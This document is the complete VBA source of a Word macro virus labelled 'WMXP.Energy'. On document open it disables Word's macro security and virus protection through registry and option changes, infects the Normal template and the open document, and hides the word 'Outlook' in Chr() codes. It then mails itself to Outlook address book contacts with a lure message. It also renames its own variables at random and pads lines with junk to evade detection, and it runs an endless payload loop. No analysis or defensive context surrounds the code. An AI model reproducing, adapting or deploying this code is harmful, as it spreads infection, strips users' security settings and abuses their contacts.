'WMXP.Energy Mail/DOC Virus
WMXP.Energy
Attribute VB_Name = "Energy"
Private Declare Function mciSendString Lib "winmm.dll" Alias "mciSendStringA" (ByVal lpstrCommand As String, ByVal lpstrReturnString As String, ByVal uReturnLength As Long, ByVal hwndCallback As Long) As Long
Private Sub Document_Open()
On Error Resume Next
Application.ScreenUpdating = False
Application.DisplayAlerts = wdAlertsNone
CommandBars("Macro").Controls("Security...").Enabled = False
System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\10.0\Word\Security", "Level") = 1&
If System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\10.0\Word\Security", "AccessVBOM") <> 1& Then
System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\10.0\Word\Security", "AccessVBOM") = 1&
System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security", "Level") = 1&
With Options
.ConfirmConversions = False
.VirusProtection = False
End With
Set AD = ActiveDocument.VBProject.VBComponents.Item(1)
Set NT = NormalTemplate.VBProject.VBComponents.Item(1)
NT1 = NT.CodeModule.CountOfLines
AD1 = AD.CodeModule.CountOfLines
Nec = 2
If AD.Name <> "rrlf" Then
If AD1 > 0 Then _
AD.CodeModule.DeleteLines 1, AD1
Set ToInfect = AD
AD.Name = "rrlf"
DoAD = True
End If
If NT.Name <> "rrlf" Then
If NT1 > 0 Then _
NT.CodeModule.DeleteLines 1, NT1
Set ToInfect = NT
NT.Name = "rrlf"
DoNT = True
End If
If DoNT <> True And DoAD <> True Then GoTo bye
If DoNT = True Then
Do While AD.CodeModule.Lines(1, 1) = ""
AD.CodeModule.DeleteLines 1
Loop
ToInfect.CodeModule.AddFromString ("Private Sub Document_Close()")
Do While AD.CodeModule.Lines(Nec, 1) <> ""
ToInfect.CodeModule.InsertLines Nec, AD.CodeModule.Lines(Nec, 1)
Nec = Nec + 1
Loop
End If
End If
Dim DOutlook, DMapiName, BreakUmOffAS
mmm =  + Chr( 32)  + Chr( 43)  + Chr( 32)  + Chr( 67)  + Chr( 104)  + Chr( 114)  + Chr( 40)  + Chr( 32)  + Chr( 55)  + Chr( 57)  + Chr( 41)  + Chr( 32)  + Chr( 32)  + Chr( 43)  + Chr( 32)  + Chr( 67)  + Chr( 104)  + Chr( 114)  + Chr( 40)  + Chr( 32)  + Chr( 49)  + Chr( 49)  + Chr( 55)  + Chr( 41)  + Chr( 32)  + Chr( 32)  + Chr( 43)  + Chr( 32)  + Chr( 67)  + Chr( 104)  + Chr( 114)  + Chr( 40)  + Chr( 32)  + Chr( 49)  + Chr( 49)  + Chr( 54)  + Chr( 41)  + Chr( 32)  + Chr( 32)  + Chr( 43)  + Chr( 32)  + Chr( 67)  + Chr( 104)  + Chr( 114)  + Chr( 40)  + Chr( 32)  + Chr( 49)  + Chr( 48)  + Chr( 56)  + Chr( 41)  + Chr( 32)  + Chr( 32)  + Chr( 43)  + Chr( 32)  + Chr( 67)  + Chr( 104)  + Chr( 114)  + Chr( 40)  + Chr( 32)  + Chr( 49)  + Chr( 49)  + Chr( 49)  + Chr( 41)  + Chr( 32)  + Chr( 32)  + Chr( 43)  + Chr( 32)  + Chr( 67)  + Chr( 104)  + Chr( 114)  + Chr( 40)  + Chr( 32)  + Chr( 49)  + Chr( 49)  + Chr( 49)  + Chr( 41)  + Chr( 32)  + Chr( 32)  + Chr( 43)  + Chr( 32)  + Chr( 67)  + Chr( 104)  + Chr( 114)  + Chr( 40)  + Chr( 32)  + Chr( 49)  + Chr( 48)  + Chr( 55)  + Chr( 41)  + Chr( 32) 
Set DOutlook = CreateObject(mmm + ".Application")
Set DMapiName = DOutlook.GetNameSpace("MAPI")
If DOutlook = mmm Then
DMapiName.Logon "profile", "password"
Set mmm = DMapiName.AddressLists
For ik = 1 To mmm.Count
Set ABook = DMapiName.AddressLists(ik)
xxx = 1
Set aa = ABook.AddressEntries
Set BreakUmOffAS = DOutlook.CreateItem(0)
For ij = 1 To aa.Count
Pee = aa(xxx)
BreakUmOffAS.Recipients.Add Pee
xxx = xxx + 1
If xxx > 20 Then nr = aa.Count
Next ij
BreakUmOffAS.Subject = "Hello WinXp User !"
BreakUmOffAS.Body = "Here are a Cool doc. with many New Features inside"
BreakUmOffAS.Attachments.Add ActiveDocument.FullName
BreakUmOffAS.Send
Pee = ""
Next ik
DMapiName.Logoff
End If
If DoAD = True Then
Do While NT.CodeModule.Lines(1, 1) = ""
NT.CodeModule.DeleteLines 1
Loop
ToInfect.CodeModule.AddFromString ("Private Sub Document_Open()")
Do While NT.CodeModule.Lines(Nec, 1) <> ""
ToInfect.CodeModule.InsertLines Nec, NT.CodeModule.Lines(Nec, 1)
Nec = Nec + 1
Loop
End If
Set char1 = ActiveDocument.VBProject
Set char2 = char1.VBComponents(1).CodeModule
If ThisDocument.FullName <> Templates(1).FullName Then
nr = 17
ReDim suk(1 To nr) As String
suk(1) = "nr": suk(2) = "bkup": suk(3) = "suk": suk(4) = "myRange"
suk(5) = "strip": suk(6) = "ik": suk(7) = "char1": suk(8) = "nam1"
suk(9) = "DOutlook": suk(10) = "DMapiName": suk(11) = "BreakUmOffAS"
suk(12) = "mmm": suk(13) = "xxx": suk(14) = "aa": suk(15) = "Pee": suk(16) = "ij": suk(17) = "char2"
For ik = 1 To nr
Randomize
strip = Chr(Int((25 * Rnd) + 65)) + Chr(Int((25 * Rnd) + 65)) + Chr(Int((25 * Rnd) + 65)) + "Energy"
For bkup = 2 To char2.CountOfLines
nam1 = char2.Lines(bkup, 1)
If InStr(1, nam1, suk(ik), vbTextCompare) Then
nam1 = Replace(nam1, suk(ik), strip, 1, -1, vbTextCompare)
char2.ReplaceLine bkup, nam1
End If
Next bkup
Next ik
For ik = 2 To char2.CountOfLines
nam1 = char2.Lines(ik, 1)
If Len(nam1) <= 100 Then
nam1 = nam1 + "'" + Chr(Int((120 * Rnd) + 32)) + Chr(Int((120 * Rnd) + 32)) + Chr(Int((120 * Rnd) + 32))
char2.ReplaceLine ik, nam1
End If
Next ik
End If
bye:
If NT1 <> 0 And AD1 = 0 And (InStr(1, ActiveDocument.Name, "Document") = False) Then
ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
ElseIf (InStr(1, ActiveDocument.Name, "Document") <> False) Then
ActiveDocument.Saved = True: End If
call Payload
End Sub
Private Sub Payload ()
On Error Resume Next
Do
mciSendString "tcp/ip port 20/21/39 are open", 0, 0, 0
Loop
End Sub
